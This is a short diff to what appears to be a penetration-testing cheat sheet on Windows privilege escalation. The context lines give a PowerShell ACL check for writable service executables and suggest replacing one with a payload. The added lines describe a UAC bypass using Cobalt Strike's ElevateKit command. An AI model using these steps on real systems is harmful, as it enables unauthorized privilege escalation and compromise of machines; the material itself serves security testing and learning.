@@ -82,3 +82,13 @@ powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service.exe" | fl
 ```
 If you get something like <span style="color:red">Access: BUILTIN\Users Allow Modify</span>, then the service is vulnerable and you can overwrite it with your payload.
 <span style="color:red">You might need to stop the service first before replacing the .exe</span>.
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>UAC Bypass</b></span>
+ Elevation of Medium Integrity processto High integrity.
+ CobaltStrike has the [ElevateKit](https://github.com/cobalt-strike/ElevateKit) that allows you to do so.
+```powershell
+elevate uac-schtasks tcp-local
+```
